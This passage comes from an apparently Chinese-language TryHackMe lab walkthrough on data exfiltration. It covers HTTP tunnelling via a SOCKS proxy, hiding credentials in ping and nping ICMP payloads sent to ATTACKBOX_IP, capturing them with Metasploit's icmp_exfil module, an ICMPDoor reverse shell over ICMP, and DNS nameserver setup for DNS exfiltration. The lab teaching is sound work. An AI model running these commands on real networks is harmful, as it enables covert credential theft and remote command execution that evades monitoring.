<p>我们需要使用 <a target="_blank" rel="noopener" href="http://neoreg.py">neoreg.py</a> 连接到客户端并提供解密隧道客户端的密钥。我们还需要提供我们在上传机器上上传的 PHP 文件的 URL。</p>
<p>一旦连接到隧道客户端，我们就可以使用隧道连接作为本地计算机上的代理绑定，端口 1080 上的 127.0.0.1。</p>
<p>例如，如果我们要访问 <a target="_blank" rel="noopener" href="http://app.thm.com">app.thm.com</a>，其内部 IP 地址为 172.20.0.121，端口为 80，我们可以使用带有 --socks5 参数的curl 命令。我们还可以使用其他代理应用程序，例如ProxyChains、FoxyProxy等来与内部网络进行通信。</p>
<pre><code class="hljs scss">root<span class="hljs-keyword">@AttackBox</span>:~$ curl --socks5 <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">1080</span> <span class="hljs-attribute">http</span>://<span class="hljs-number">172.20</span>.<span class="hljs-number">0.121</span>:<span class="hljs-number">80</span>
Welcome to APP Server!</code></pre>
<p>下图显示了流量通过上传机器，然后与内部网络设备（在本例中为应用程序机器）通信的情况。请注意，如果我们检查来自 App 机器的网络流量，我们会看到传入流量的源 IP 地址来自上传者机器。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009664.png" alt></p>
<p>现在复制 HTTP 隧道步骤，通过 HTTP 协议建立隧道，以 172.20.0.120 作为端口 80 上的 IP 地址与 <a target="_blank" rel="noopener" href="http://flag.thm.com">flag.thm.com</a> 进行通信。请注意，如果您从同一网络内的其他计算机访问 <a target="_blank" rel="noopener" href="http://flag.thm.com">flag.thm.com</a> 网站，网络，你不会得到标志。<br>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009665.png" alt><br>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009666.png" alt></p>
<h1 id="0x07-使用-icmp-渗透">0x07 使用 ICMP 渗透</h1>
<p>在此任务中，我们将展示如何使用 ICMP 协议窃取数据。 ICMP 代表互联网控制消息协议，它是用于处理错误报告的网络层协议。如果您需要有关 ICMP 和计算机网络基础知识的更多信息，您可以访问以下 THM 室：<a target="_blank" rel="noopener" href="https://tryhackme.com/room/whatisnetworking">什么是网络</a>。</p>
<p>路由器等网络设备使用 ICMP 协议来检查设备之间的网络连接。请注意，ICMP 协议不是在设备之间发送数据的传输协议。假设两台主机需要测试网络中的连通性；然后，我们可以使用 ping 命令通过网络发送 ICMP 数据包，如下图所示。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009667.png" alt></p>
<p>HOST1 发送带有回显请求数据包的 ICMP 数据包。然后，如果 HOST2 可用，它会发回一个 ICMP 数据包，其中包含确认可用性的回显应答消息。</p>
<h2 id="icmp-数据部分">ICMP 数据部分</h2>
<p>在较高级别上，ICMP 数据包的结构包含一个数据部分，其中可以包含字符串或其他信息的副本，例如用于错误消息的 IPv4 标头。下图显示了数据部分，该部分是可选使用的。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009668.png" alt></p>
<p>请注意，数据字段是可选的，可以为空，也可以在通信期间包含随机字符串。作为攻击者，我们可以使用 ICMP 结构将我们的数据包含在数据部分中，并通过 ICMP 数据包将其发送到另一台机器。另一台机器必须捕获带有 ICMP 数据包的网络流量才能接收数据。</p>
<p>要执行手动 ICMP 数据过滤，我们需要更多地讨论 ping 命令。 ping 命令是任何操作系统中都可用的网络管理员软件。它用于通过发送ICMP数据包来检查可达性和可用性，可以如下使用：</p>
<pre><code class="hljs scss">thm<span class="hljs-keyword">@AttackBox</span>$ ping <span class="hljs-number">10.10</span>.<span class="hljs-number">41.88</span> -c <span class="hljs-number">1</span></code></pre>
<p>我们选择使用上一个命令中的 -c 1 参数，从主机 1（我们的 AttackBox）发送一个 ICMP 数据包到主机 2（目标机器）。现在让我们检查 Wireshark 中的 ICMP 数据包，看看数据部分是什么样的。<br>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009669.png" alt></p>
<p>Wireshark 截图显示，数据部分已被随机字符串选中。需要注意的是，此部分可能填充了需要传输到另一台机器的数据。</p>
<p>Linux 操作系统中的 ping 命令有一个有趣的 ICMP 选项。使用 -p 参数，我们可以以十六进制表示形式指定要通过数据包发送的 16 字节数据。请注意，-p 选项仅适用于 Linux 操作系统。我们可以通过查看 ping 的帮助手册页来确认</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009670.png" alt></p>
<p>假设我们需要窃取以下凭据 thm:tryhackme。首先，我们需要将其转换为十六进制表示形式，然后使用 -p 选项将其传递给 ping 命令，如下所示：</p>
<pre><code class="hljs scss">root<span class="hljs-keyword">@AttackBox</span>$ echo <span class="hljs-string">"thm:tryhackme"</span> | xxd -p 
<span class="hljs-number">74686</span>d3a7472796861636b6d650a

`xxd` 是一个十六进制编辑器，它可以将二进制数据转换为十六进制表示，或者将十六进制表示转换回二进制数据。

- **`-p`**：`xxd` 的选项，表示以纯十六进制字符输出（plain hexdump style），即每个字节用两个十六进制字符表示，并且输出中不包含额外的信息如偏移量或ASCII表示。</code></pre>
<p>我们使用 xxd 命令将字符串转换为十六进制，然后我们可以使用 ping 命令以及转换 thm:tryhackme 得到的十六进制值。</p>
<pre><code class="hljs scss">root<span class="hljs-keyword">@AttackBox</span>$ ping <span class="hljs-number">10.10</span>.<span class="hljs-number">41.88</span> -c <span class="hljs-number">1</span> -p <span class="hljs-number">74686</span>d3a7472796861636b6d650a</code></pre>
<p>我们使用 ping 命令和 thm:tryhackme 数据发送了一个 ICMP 数据包。让我们看看 Wireshark 中该数据包的数据部分。<br>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009671.png" alt></p>
<p>出色的！我们已经成功地用我们的数据填充了 ICMP 的数据部分，并使用 ping 命令通过网络手动发送它。</p>
<h2 id="icmp-数据泄露">ICMP 数据泄露</h2>
<p>现在我们已经掌握了通过 ICMP 数据包手动发送数据的基本原理，接下来我们讨论如何使用 Metasploit 来窃取数据。 Metasploit 框架使用上一节中解释的相同技术。但是，它将捕获传入的 ICMP 数据包并等待文件开始 (BOF) 触发值。一旦收到，它就会写入磁盘，直到获得文件结束 (EOF) 触发值。下图显示了 Metasploit 框架所需的步骤。由于我们需要 Metasploit 框架来实现此技术，因此我们需要 AttackBox 机器才能成功执行此攻击。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009672.png" alt></p>
<p>现在，在 AttackBox 中，我们通过选择 icmp_exfil 模块来设置 Metasploit 框架，使其准备好捕获和侦听 ICMP 流量。该模块的要求之一是设置基于 TCPDUMP 规则的 BPF_FILTER 选项，以仅捕获 ICMP 数据包并忽略任何具有攻击机器源 IP 的 ICMP 数据包，如下所示：</p>
<pre><code class="hljs scss">msf5 &gt; use auxiliary/server/icmp_exfil
msf5 <span class="hljs-built_in">auxiliary</span>(server/icmp_exfil) &gt; set BPF_FILTER icmp and not <span class="hljs-attribute">src</span> ATTACKBOX_IP
BPF_FILTER =&gt; icmp and not <span class="hljs-attribute">src</span> ATTACKBOX_IP</code></pre>
<p>我们还需要选择要监听的网络接口 eth0（但我这里是tun0）。最后执行run来启动模块。</p>
<pre><code class="hljs scss">msf5 <span class="hljs-built_in">auxiliary</span>(server/icmp_exfil) &gt; set INTERFACE eth0
INTERFACE =&gt; eth0
msf5 <span class="hljs-built_in">auxiliary</span>(server/icmp_exfil) &gt; run
    
<span class="hljs-selector-attr">[*]</span> ICMP Listener started on eth0 (ATTACKBOX_IP). Monitoring for trigger packet containing ^BOF
<span class="hljs-selector-attr">[*]</span> Filename expected in initial packet, directly following trigger (e.g. ^BOFfilename.ext)</code></pre>
<p>我们准备了 <a target="_blank" rel="noopener" href="http://icmp.thm.com">icmp.thm.com</a> 作为受害者机器，使用所需的工具完成 ICMP 任务。从 JumpBox 中，使用 thm:tryhackme 凭据登录到 <a target="_blank" rel="noopener" href="http://icmp.thm.com">icmp.thm.com</a>。</p>
<p>我们预装了 <a target="_blank" rel="noopener" href="https://nmap.org/nping/">nping</a> 工具，这是一个用于网络数据包生成、响应分析和响应时间测量的开源工具。 NPING 工具是 NMAP 套件工具的一部分。</p>
<p>首先，我们将从 ICMP 机器发送 BOF 触发器，以便 Metasploit 框架开始写入磁盘。</p>
<pre><code class="hljs scss">thm<span class="hljs-keyword">@jump-box</span>$ ssh thm<span class="hljs-keyword">@icmp</span>.thm.com
thm<span class="hljs-keyword">@icmp-host</span>:~# sudo nping --icmp -c <span class="hljs-number">1</span> ATTACKBOX_IP --data-string <span class="hljs-string">"BOFfile.txt"</span>
    
Starting Nping <span class="hljs-number">0.7</span>.<span class="hljs-number">80</span> ( <span class="hljs-attribute">https</span>://nmap.org/nping ) at <span class="hljs-number">2022</span>-<span class="hljs-number">04</span>-<span class="hljs-number">25</span> <span class="hljs-number">23</span>:<span class="hljs-number">23</span> EEST
SENT (<span class="hljs-number">0.0369s</span>) ICMP [<span class="hljs-number">192.168</span>.<span class="hljs-number">0.121</span> &gt; ATTACKBOX_IP Echo request (type=<span class="hljs-number">8</span>/code=<span class="hljs-number">0</span>) id=<span class="hljs-number">7785</span> seq=<span class="hljs-number">1</span>] IP [ttl=<span class="hljs-number">64</span> id=<span class="hljs-number">40595</span> iplen=<span class="hljs-number">39</span> ]
RCVD (<span class="hljs-number">0.0376s</span>) ICMP [ATTACKBOX_IP &gt; <span class="hljs-number">192.168</span>.<span class="hljs-number">0.121</span> Echo reply (type=<span class="hljs-number">0</span>/code=<span class="hljs-number">0</span>) id=<span class="hljs-number">7785</span> seq=<span class="hljs-number">1</span>] IP [ttl=<span class="hljs-number">63</span> id=<span class="hljs-number">12656</span> iplen=<span class="hljs-number">39</span> ]
RCVD (<span class="hljs-number">0.0755s</span>) ICMP [ATTACKBOX_IP &gt; <span class="hljs-number">192.168</span>.<span class="hljs-number">0.121</span> Echo reply (type=<span class="hljs-number">0</span>/code=<span class="hljs-number">0</span>) id=<span class="hljs-number">7785</span> seq=<span class="hljs-number">1</span>] IP [ttl=<span class="hljs-number">31</span> id=<span class="hljs-number">60759</span> iplen=<span class="hljs-number">32</span> ]
    
Max <span class="hljs-attribute">rtt</span>: <span class="hljs-number">38.577ms</span> | Min <span class="hljs-attribute">rtt</span>: <span class="hljs-number">0.636ms</span> | Avg <span class="hljs-attribute">rtt</span>: <span class="hljs-number">19.606ms</span>
Raw packets <span class="hljs-attribute">sent</span>: <span class="hljs-number">1</span> (<span class="hljs-number">39</span>B) | <span class="hljs-attribute">Rcvd</span>: <span class="hljs-number">2</span> (<span class="hljs-number">71</span>B) | <span class="hljs-attribute">Lost</span>: <span class="hljs-number">0</span> (<span class="hljs-number">0.00%</span>)
Nping <span class="hljs-attribute">done</span>: <span class="hljs-number">1</span> IP address pinged in <span class="hljs-number">1.06</span> seconds</code></pre>
<p>我们使用带有 --data-string 参数的 nping 命令发送了一个 ICMP 数据包。我们使用文件名 BOFfile.txt 指定触发器值，该文件名是 Metasploit 框架中默认设置的。如果需要，可以从 Metasploit 更改此设置！</p>
<p>现在检查 AttackBox 终端。如果一切设置正确，Metasploit 框架应该识别触发器值并等待数据写入磁盘。</p>
<p>让我们开始从 ICMP 机器发送所需的数据和文件结束触发值。</p>
<pre><code class="hljs scss">thm<span class="hljs-keyword">@icmp-host</span>:~# sudo nping --icmp -c <span class="hljs-number">1</span> ATTACKBOX_IP --data-string <span class="hljs-string">"admin:password"</span>
    
Starting Nping <span class="hljs-number">0.7</span>.<span class="hljs-number">80</span> ( <span class="hljs-attribute">https</span>://nmap.org/nping ) at <span class="hljs-number">2022</span>-<span class="hljs-number">04</span>-<span class="hljs-number">25</span> <span class="hljs-number">23</span>:<span class="hljs-number">23</span> EEST
SENT (<span class="hljs-number">0.0312s</span>) ICMP [<span class="hljs-number">192.168</span>.<span class="hljs-number">0.121</span> &gt; ATTACKBOX_IP Echo request (type=<span class="hljs-number">8</span>/code=<span class="hljs-number">0</span>) id=<span class="hljs-number">14633</span> seq=<span class="hljs-number">1</span>] IP [ttl=<span class="hljs-number">64</span> id=<span class="hljs-number">13497</span> iplen=<span class="hljs-number">42</span> ]
RCVD (<span class="hljs-number">0.0328s</span>) ICMP [ATTACKBOX_IP &gt; <span class="hljs-number">192.168</span>.<span class="hljs-number">0.121</span> Echo reply (type=<span class="hljs-number">0</span>/code=<span class="hljs-number">0</span>) id=<span class="hljs-number">14633</span> seq=<span class="hljs-number">1</span>] IP [ttl=<span class="hljs-number">63</span> id=<span class="hljs-number">17031</span> iplen=<span class="hljs-number">42</span> ]
RCVD (<span class="hljs-number">0.0703s</span>) ICMP [ATTACKBOX_IP &gt; <span class="hljs-number">192.168</span>.<span class="hljs-number">0.121</span> Echo reply (type=<span class="hljs-number">0</span>/code=<span class="hljs-number">0</span>) id=<span class="hljs-number">14633</span> seq=<span class="hljs-number">1</span>] IP [ttl=<span class="hljs-number">31</span> id=<span class="hljs-number">41138</span> iplen=<span class="hljs-number">30</span> ]
    
Max <span class="hljs-attribute">rtt</span>: <span class="hljs-number">39.127ms</span> | Min <span class="hljs-attribute">rtt</span>: <span class="hljs-number">1.589ms</span> | Avg <span class="hljs-attribute">rtt</span>: <span class="hljs-number">20.358ms</span>
Raw packets <span class="hljs-attribute">sent</span>: <span class="hljs-number">1</span> (<span class="hljs-number">42</span>B) | <span class="hljs-attribute">Rcvd</span>: <span class="hljs-number">2</span> (<span class="hljs-number">72</span>B) | <span class="hljs-attribute">Lost</span>: <span class="hljs-number">0</span> (<span class="hljs-number">0.00%</span>)
Nping <span class="hljs-attribute">done</span>: <span class="hljs-number">1</span> IP address pinged in <span class="hljs-number">1.06</span> seconds 
    
thm<span class="hljs-keyword">@icmp-host</span>:~# sudo nping --icmp -c <span class="hljs-number">1</span> ATTACKBOX_IP --data-string <span class="hljs-string">"admin2:password2"</span>
    
Starting Nping <span class="hljs-number">0.7</span>.<span class="hljs-number">80</span> ( <span class="hljs-attribute">https</span>://nmap.org/nping ) at <span class="hljs-number">2022</span>-<span class="hljs-number">04</span>-<span class="hljs-number">25</span> <span class="hljs-number">23</span>:<span class="hljs-number">24</span> EEST
SENT (<span class="hljs-number">0.0354s</span>) ICMP [<span class="hljs-number">192.168</span>.<span class="hljs-number">0.121</span> &gt; ATTACKBOX_IP Echo request (type=<span class="hljs-number">8</span>/code=<span class="hljs-number">0</span>) id=<span class="hljs-number">39051</span> seq=<span class="hljs-number">1</span>] IP [ttl=<span class="hljs-number">64</span> id=<span class="hljs-number">32661</span> iplen=<span class="hljs-number">44</span> ]
RCVD (<span class="hljs-number">0.0358s</span>) ICMP [ATTACKBOX_IP &gt; <span class="hljs-number">192.168</span>.<span class="hljs-number">0.121</span> Echo reply (type=<span class="hljs-number">0</span>/code=<span class="hljs-number">0</span>) id=<span class="hljs-number">39051</span> seq=<span class="hljs-number">1</span>] IP [ttl=<span class="hljs-number">63</span> id=<span class="hljs-number">18581</span> iplen=<span class="hljs-number">44</span> ]
RCVD (<span class="hljs-number">0.0748s</span>) ICMP [ATTACKBOX_IP &gt; <span class="hljs-number">192.168</span>.<span class="hljs-number">0.121</span> Echo reply (type=<span class="hljs-number">0</span>/code=<span class="hljs-number">0</span>) id=<span class="hljs-number">39051</span> seq=<span class="hljs-number">1</span>] IP [ttl=<span class="hljs-number">31</span> id=<span class="hljs-number">2149</span> iplen=<span class="hljs-number">30</span> ]
    
Max <span class="hljs-attribute">rtt</span>: <span class="hljs-number">39.312ms</span> | Min <span class="hljs-attribute">rtt</span>: <span class="hljs-number">0.371ms</span> | Avg <span class="hljs-attribute">rtt</span>: <span class="hljs-number">19.841ms</span>
Raw packets <span class="hljs-attribute">sent</span>: <span class="hljs-number">1</span> (<span class="hljs-number">44</span>B) | <span class="hljs-attribute">Rcvd</span>: <span class="hljs-number">2</span> (<span class="hljs-number">74</span>B) | <span class="hljs-attribute">Lost</span>: <span class="hljs-number">0</span> (<span class="hljs-number">0.00%</span>)
Nping <span class="hljs-attribute">done</span>: <span class="hljs-number">1</span> IP address pinged in <span class="hljs-number">1.07</span> seconds 
    
thm<span class="hljs-keyword">@icmp-host</span>:~# sudo nping --icmp -c <span class="hljs-number">1</span> ATTACKBOX_IP --data-string <span class="hljs-string">"EOF"</span>
    
Starting Nping <span class="hljs-number">0.7</span>.<span class="hljs-number">80</span> ( <span class="hljs-attribute">https</span>://nmap.org/nping ) at <span class="hljs-number">2022</span>-<span class="hljs-number">04</span>-<span class="hljs-number">25</span> <span class="hljs-number">23</span>:<span class="hljs-number">24</span> EEST
SENT (<span class="hljs-number">0.0364s</span>) ICMP [<span class="hljs-number">192.168</span>.<span class="hljs-number">0.121</span> &gt; ATTACKBOX_IP Echo request (type=<span class="hljs-number">8</span>/code=<span class="hljs-number">0</span>) id=<span class="hljs-number">33619</span> seq=<span class="hljs-number">1</span>] IP [ttl=<span class="hljs-number">64</span> id=<span class="hljs-number">51488</span> iplen=<span class="hljs-number">31</span> ]
RCVD (<span class="hljs-number">0.0369s</span>) ICMP [ATTACKBOX_IP &gt; <span class="hljs-number">192.168</span>.<span class="hljs-number">0.121</span> Echo reply (type=<span class="hljs-number">0</span>/code=<span class="hljs-number">0</span>) id=<span class="hljs-number">33619</span> seq=<span class="hljs-number">1</span>] IP [ttl=<span class="hljs-number">63</span> id=<span class="hljs-number">19671</span> iplen=<span class="hljs-number">31</span> ]
RCVD (<span class="hljs-number">0.3760s</span>) ICMP [ATTACKBOX_IP &gt; <span class="hljs-number">192.168</span>.<span class="hljs-number">0.121</span> Echo reply (type=<span class="hljs-number">0</span>/code=<span class="hljs-number">0</span>) id=<span class="hljs-number">33619</span> seq=<span class="hljs-number">1</span>] IP [ttl=<span class="hljs-number">31</span> id=<span class="hljs-number">1003</span> iplen=<span class="hljs-number">36</span> ]
    
Max <span class="hljs-attribute">rtt</span>: <span class="hljs-number">339.555ms</span> | Min <span class="hljs-attribute">rtt</span>: <span class="hljs-number">0.391ms</span> | Avg <span class="hljs-attribute">rtt</span>: <span class="hljs-number">169.973ms</span>
Raw packets <span class="hljs-attribute">sent</span>: <span class="hljs-number">1</span> (<span class="hljs-number">31</span>B) | <span class="hljs-attribute">Rcvd</span>: <span class="hljs-number">2</span> (<span class="hljs-number">67</span>B) | <span class="hljs-attribute">Lost</span>: <span class="hljs-number">0</span> (<span class="hljs-number">0.00%</span>)
Nping <span class="hljs-attribute">done</span>: <span class="hljs-number">1</span> IP address pinged in <span class="hljs-number">1.07</span> seconds
thm<span class="hljs-keyword">@icmp-host</span>:~#</code></pre>
<p>发送完数据和结束触发值后，让我们检查一下 AttackBox。</p>
<pre><code class="hljs scss">msf5 <span class="hljs-built_in">auxiliary</span>(server/icmp_exfil) &gt; run
    
<span class="hljs-selector-attr">[*]</span> ICMP Listener started on eth0 (ATTACKBOX_IP). Monitoring for trigger packet containing ^BOF
<span class="hljs-selector-attr">[*]</span> Filename expected in initial packet, directly following trigger (e.g. ^BOFfilename.ext)
<span class="hljs-selector-attr">[+]</span> Beginning capture of "file<span class="hljs-selector-class">.txt</span>" data
<span class="hljs-selector-attr">[*]</span> <span class="hljs-number">30</span> bytes of data received in total
<span class="hljs-selector-attr">[+]</span> End of File received. Saving "file<span class="hljs-selector-class">.txt</span>" to loot
<span class="hljs-selector-attr">[+]</span> Incoming file "file<span class="hljs-selector-class">.txt</span>" saved to loot
<span class="hljs-selector-attr">[+]</span> Loot filename: /root/.msf4/loot/<span class="hljs-number">20220425212408</span>_default_ATTACKBOX_IP_icmp_exfil_838825.txt</code></pre>
<p>好的！我们已经使用 Metasploit 框架成功通过 ICMP 协议传输数据。您可以检查终端中提到的战利品文件来确认收到的数据。</p>
<h2 id="icmp-c2-通信">ICMP C2 通信</h2>
<p>接下来，我们将展示使用 <a target="_blank" rel="noopener" href="https://github.com/krabelize/icmpdoor">ICMPDoor</a> 工具通过 ICMP 协议执行命令。 ICMPDoor 是一个用 Python3 和 scapy 编写的开源反向 shell。该工具使用我们在本任务前面讨论的相同概念，其中攻击者利用 ICMP 数据包中的数据部分。唯一的区别是攻击者发送需要在受害者机器上执行的命令。一旦命令被执行，受害机器就会在数据部分的 ICMP 数据包中发送执行输出。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009673.png" alt></p>
<p>我们已经准备好了在 JumpBox 和 ICMP 主机上通过 ICMP 协议进行 C2 通信所需的工具。首先，<a target="_blank" rel="noopener" href="http://xn--ICMPicmp-or1mv3ytpmj30a72hvysn47cjv9ce75b.thm.com">我们需要登录到ICMP机器icmp.thm.com</a>，并执行icmpdoor二进制文件，如下所示，</p>
<pre><code class="hljs scss">thm<span class="hljs-keyword">@icmp-host</span>:~$ sudo icmpdoor -i eth0 -d <span class="hljs-number">192.168</span>.<span class="hljs-number">0.133</span></code></pre>
<p>请注意，我们指定了通信的接口以及服务器端的目标 IP。</p>
<p>接下来，登录到 JumpBox 并执行 icmp-cnc 二进制文件以与受害者（我们的 ICMP 主机）进行通信。一旦执行正确运行，就会通过 ICMP 协议建立通信通道。现在我们准备发送需要在受害机器上执行的命令。</p>
<pre><code class="hljs scss">thm<span class="hljs-keyword">@jump-box</span>$  sudo icmp-cnc -i eth1 -d <span class="hljs-number">192.168</span>.<span class="hljs-number">0.121</span>
<span class="hljs-attribute">shell</span>: hostname
hostname
<span class="hljs-attribute">shell</span>: icmp-host</code></pre>
<p>与客户端二进制文件类似，确保选择通信接口以及目标 IP。正如前面的终端所示，我们请求执行 hostname 命令，并且收到了 icmp-host。</p>
<p>为了确认所有通信都经过 ICMP 协议，我们使用 tcpdump 捕获通信过程中的网络流量，如下所示：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009674.png" alt></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009675.png" alt></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009676.png" alt></p>
<h1 id="0x08-dns-配置">0x08 DNS 配置</h1>
<p>通过DNS协议进行渗透，需要控制域名并设置DNS记录，包括NS、A或TXT。因此，我们提供了一个Web界面，方便您添加和修改DNS记录。以下域名已设置并准备好执行 DNS 渗透任务：<a target="_blank" rel="noopener" href="http://tunnel.com">tunnel.com</a>.</p>
<p>要访问该网站，您可以访问以下链接：<a target="_blank" rel="noopener" href="http://10.10.41.88/">http://10.10.41.88/</a> 或 <a target="_blank" rel="noopener" href="https://10-10-41-88.p.thmlabs.com/">https://10-10-41-88.p.thmlabs.com/</a> 无需 VPN。<br>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009677.png" alt></p>
<p>选择域名后，您可以添加 DNS 记录并测试并在出现问题时重置 DNS 配置.</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009678.png" alt></p>
<h2 id="新攻击机">新攻击机</h2>
<p>请注意，我们在网络 2 中添加了一台新的攻击者机器，该机器具有以下子域名和 IP 地址：</p>
<table>
<thead>
<tr>
<th>**Domain Name&nbsp;**</th>
<th><strong>IP Address</strong></th>
<th><strong>Network Access</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><a target="_blank" rel="noopener" href="http://attacker.thm.com">attacker.thm.com</a></td>
<td>172.20.0.200</td>
<td>Network 2</td>
</tr>
</tbody>
</table>
<p>我们将使用攻击者机器在 DNS 和 DNS 隧道场景中进行渗透。主要目标是攻击者机器（在 Network2 上）可以通过 JumpBox 访问网络 1 的内部网络设备。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009679.png" alt></p>
<h2 id="用于-dns-渗透的名称服务器">用于 DNS 渗透的名称服务器</h2>
<p>为了在所提供的网络或互联网上成功执行 DNS 渗透，我们需要为我们控制的域名设置一个名称服务器，如下所示：</p>
<ol>
<li>添加指向 AttackBox 的 IP 地址的 A 记录。例如，<strong>A</strong>, Subdomain Name:&nbsp;<strong>t1ns</strong>, Value:&nbsp;<strong>AttackBox_IP</strong>.</li>
<li>添加一条 NS 记录，将 DNS 查询路由到步骤 1 中的 A 记录。例如，Type：NS, Subdomain Name:&nbsp;t1, Value:&nbsp;<a target="_blank" rel="noopener" href="http://t1ns.tunnel.com">t1ns.tunnel.com</a>.</li>
</ol>
<p>确保我们为 NS 值指定完整域名：<a target="_blank" rel="noopener" href="http://t1ns.tunnel.com">t1ns.tunnel.com</a>。添加两条记录后，名称服务器 <a target="_blank" rel="noopener" href="http://t1.tunnel.com">t1.tunnel.com</a> 就可以用于 DNS 过滤目的。</p>
<p>如果您选择不设置 AttackBox，我们会在我们提供的网络中为攻击者计算机设置一个名称服务器，并且可以按如下方式使用：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009680.png" alt></p>
<p>请注意，<a target="_blank" rel="noopener" href="http://attNS.thm.com">attNS.thm.com</a> IP 地址指向我们网络中新添加的攻击者计算机，并且它已准备好在我们的环境中 JumpBox 和攻击者之间用于 DNS 任务和目的。</p>
<h2 id="实验室建议">实验室建议</h2>
<p>尽管您可以在该房间中使用 AttackBox，但我们建议对大多数部分（TCP、SSH、ICMP、DNS）使用 JumpBox，以避免 DNS 和网络方面的技术问题。如果您更喜欢使用 AttackBox 执行 DNS 隧道任务（任务 10），则必须将 AttackBox 的 DNS 设置更改为 10.10.41.88 有多种方法可以更改 AttackBox 计算机中的 DNS 设置。然而，以下是我们为我们的环境找到的稳定解决方案之一。</p>
<p>首先，我们需要编辑 Yaml Netplan 配置文件。</p>
<pre><code class="hljs scss">root<span class="hljs-keyword">@AttackBox</span>:~# nano /etc/netplan/aws-vmimport-netplan.yaml</code></pre>
<p>修改Netplan配置文件，在eth0接口下添加nameserver部分，如下：</p>
<pre><code class="hljs yaml"><span class="hljs-comment"># Automatically generated by the vm import process</span>
 <span class="hljs-attr">network:</span>
     <span class="hljs-attr">ethernets:</span>
         <span class="hljs-attr">eth0:</span>
             <span class="hljs-attr">dhcp4:</span> <span class="hljs-literal">true</span>
             <span class="hljs-attr">optional:</span> <span class="hljs-literal">false</span>
             <span class="hljs-attr">nameservers:</span>
                <span class="hljs-attr">search:</span> [<span class="hljs-string">tunnel.com</span>]
